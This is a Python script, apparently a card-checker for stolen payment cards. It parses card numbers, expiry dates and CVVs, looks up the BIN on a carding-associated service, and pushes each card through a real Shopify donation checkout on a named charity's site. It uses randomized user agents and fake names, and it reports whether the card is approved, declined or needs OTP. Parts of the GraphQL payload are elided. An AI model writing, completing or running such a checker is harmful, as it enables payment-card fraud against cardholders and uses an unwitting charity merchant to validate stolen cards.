# cc.py - This file contains the original sh function.
import aiohttp
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import re
import base64
import json
import uuid
import time
import asyncio
import random

def find_between(s, first, last):
    try:
        start = s.index(first) + len(first)
        end = s.index(last, start)
        return s[start:end]
    except ValueError:
        return ""

async def sh(message: str):
    start_time = time.time()
    text = message.strip()
    pattern = r'(\d{16})[^\d]*(\d{2})[^\d]*(\d{2,4})[^\d]*(\d{3})' 
    match = re.search(pattern, text)

    if not match:
        return {
            "status": "ERROR",
            "response": "Invalid card format. Please provide a valid card number, month, year, and cvv.",
            "auth_code": None,
            "network": None,
            "avs": None,
            "cvv": None,
            "bin": {}
        }
        
    n = match.group(1)
    cc = " ".join(n[i:i+4] for i in range(0, len(n), 4))
    mm = match.group(2)
    mm = str(int(mm)) 
    yy = match.group(3)
    if len(yy) == 4 and yy.startswith("20"):
        yy = yy[2:]
    elif len(yy) == 2:
        yy = yy
    else:
        return {
            "status": "ERROR",
            "response": "Invalid year format.",
            "auth_code": None,
            "network": None,
            "avs": None,
            "cvv": None,
            "bin": {}
        }
    cvc = match.group(4)
    full_card = f"{n}|{mm}|{yy}|{cvc}"

    ua = UserAgent()
    user_agent = ua.random

    emails = [
        "nicochan275@gmail.com",
        # add more if needed
    ]
    first_names = ["John", "Emily", "Alex", "Nico", "Tom", "Sarah", "Liam"]
    last_names = ["Smith", "Johnson", "Miller", "Brown", "Davis", "Wilson", "Moore"]
    remail = random.choice(emails)
    rfirst = random.choice(first_names)
    rlast = random.choice(last_names)

    bin_info = {}

    async with aiohttp.ClientSession() as session:
        # BIN Lookup
        try:
            async with session.get(f'https://bins.antipublic.cc/bins/{n}') as res:
                z = await res.json()
                bin_info = {
                    "scheme": z.get("scheme", "").upper(),
                    "type": z.get("type", "").upper(),
                    "brand": z.get("brand", ""),
                    "bank": z.get("bank", ""),
                    "country": z.get("country_name", "")
                }
        except Exception:
            return {
                "status": "ERROR",
                "response": "BIN Lookup failed",
                "auth_code": None,
                "network": None,
                "avs": None,
                "cvv": None,
                "bin": {}
            }

        # Step 1: Add-to-cart
        cart_url = "https://www.buildingnewfoundations.com/cart/add.js"
        cart_headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.buildingnewfoundations.com',
            'referer': 'https://www.buildingnewfoundations.com/products/general-donation-specify-amount',
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user_agent,
        }
        cart_data = {
            'form_type': 'product',
            'utf8': '✓',
            'id': '39555780771934',
            'quantity': '1',
            'product-id': '6630341279838',
            'section-id': 'product-template',
        }
        async with session.post(cart_url, headers=cart_headers, data=cart_data) as response:
            if response.status != 200:
                return {
                    "status": "ERROR",
                    "response": "Add-to-cart failed",
                    "auth_code": None,
                    "network": None,
                    "avs": None,
                    "cvv": None,
                    "bin": bin_info
                }

        async with session.get('https://www.buildingnewfoundations.com/cart.js', headers={'user-agent': user_agent}) as response:
            try:
                res_json = await response.json()
                tok = res_json['token']
            except Exception:
                return {
                    "status": "ERROR",
                    "response": "Failed to retrieve cart token",
                    "auth_code": None,
                    "network": None,
                    "avs": None,
                    "cvv": None,
                    "bin": bin_info
                }

        # Step 2: Retrieve checkout tokens
        checkout_headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.buildingnewfoundations.com',
            'referer': 'https://www.buildingnewfoundations.com/cart',
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent,
        }
        checkout_data = {
            'updates[]': '1',
            'checkout': 'Check out',
        }
        async with session.post('https://www.buildingnewfoundations.com/cart', headers=checkout_headers, data=checkout_data, allow_redirects=True) as response:
            text_html = await response.text()
            x_token = find_between(text_html, 'serialized-session-token" content="&quot;', '&quot;"')
            queue_token = find_between(text_html, '&quot;queueToken&quot;:&quot;', '&quot;')
            stableid = find_between(text_html, 'stableId&quot;:&quot;', '&quot;')
            pm_identifier = find_between(text_html, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
            if not (x_token and stableid and pm_identifier):
                return {
                    "status": "ERROR",
                    "response": "Missing checkout tokens",
                    "auth_code": None,
                    "network": None,
                    "avs": None,
                    "cvv": None,
                    "bin": bin_info
                }

        # Step 3: PCI tokenization
        pci_headers = {
            'authority': 'checkout.pci.shopifyinc.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com',
            'referer': 'https://checkout.pci.shopifyinc.com/build/d3eb175/number-ltr.html?identifier=&locationURL=',
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user_agent,
        }
        json_data = {
            'credit_card': {
                'number': cc,
                'month': mm,
                'year': yy,
                'verification_value': cvc,
                'start_month': None,
                'start_year': None,
                'issue_number': '',
                'name': f'{rfirst} {rlast}',
            },
            'payment_session_scope': 'buildingnewfoundations.com',
        }
        async with session.post('https://checkout.pci.shopifyinc.com/sessions', headers=pci_headers, json=json_data) as response:
            try:
                sid = (await response.json())['id']
            except Exception:
                return {
                    "status": "ERROR",
                    "response": "PCI token failed",
                    "auth_code": None,
                    "network": None,
                    "avs": None,
                    "cvv": None,
                    "bin": bin_info
                }

        # Step 4: Submit payment via GraphQL
        gql_headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': 'https://www.buildingnewfoundations.com',
            'referer': 'https://www.buildingnewfoundations.com/',
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'user-agent': user_agent,
            'x-checkout-one-session-token': x_token,
            'x-checkout-web-build-id': '2b95ad540c597663bf352e66365c38405a52ae8e',
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'yes',
            'x-checkout-web-source-id': tok,
        }
        params = {'operationName': 'SubmitForCompletion'}
        json_payload = {
            'query': 'mutation SubmitForCompletion($input:NegotiationInput!, $attemptToken:String!){ ... }',
            'variables': {
                'input': {
                    'sessionInput': { 'sessionToken': x_token },
                    'queueToken': queue_token,
                    # include other fields as per the original cc.py logic...
                },
                'attemptToken': tok,
            },
            'operationName': 'SubmitForCompletion',
        }
        async with session.post('https://www.buildingnewfoundations.com/checkouts/unstable/graphql', params=params, headers=gql_headers, json=json_payload) as response:
            raw_response = await response.text()
            try:
                res_json = json.loads(raw_response)
                rid = res_json['data']['submitForCompletion']['receipt']['id']
            except Exception:
                return {
                    "status": "ERROR",
                    "response": "GraphQL submission failed",
                    "auth_code": None,
                    "network": None,
                    "avs": None,
                    "cvv": None,
                    "bin": bin_info
                }

        # Step 5: Poll for receipt
        poll_headers = gql_headers.copy()
        poll_params = {'operationName': 'PollForReceipt'}
        poll_json_payload = {
            'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){ ... }',
            'variables': {
                'receiptId': rid,
                'sessionToken': x_token,
            },
            'operationName': 'PollForReceipt',
        }
        elapsed_time = time.time() - start_time
        async with session.post('https://www.buildingnewfoundations.com/checkouts/unstable/graphql', params=poll_params, headers=poll_headers, json=poll_json_payload) as response:
            poll_text = await response.text()
            if "thank" in poll_text.lower():
                return {
                    "status": "APPROVED",
                    "response": f"Order confirmed. Taken: {elapsed_time:.2f}s",
                    "auth_code": None,
                    "network": None,
                    "avs": None,
                    "cvv": None,
                    "bin": bin_info
                }
            elif "actionqequiredreceipt" in poll_text.lower():
                return {
                    "status": "OTP_REQUIRED",
                    "response": f"Action Required. Taken: {elapsed_time:.2f}s",
                    "auth_code": None,
                    "network": None,
                    "avs": None,
                    "cvv": None,
                    "bin": bin_info
                }
            else:
                return {
                    "status": "DECLINED",
                    "response": "Payment declined or processing failed.",
                    "auth_code": None,
                    "network": None,
                    "avs": None,
                    "cvv": None,
                    "bin": bin_info
                }

# For standalone testing, you could use:
if __name__ == "__main__":
    card = input("Card: ")
    print(asyncio.run(sh(card)))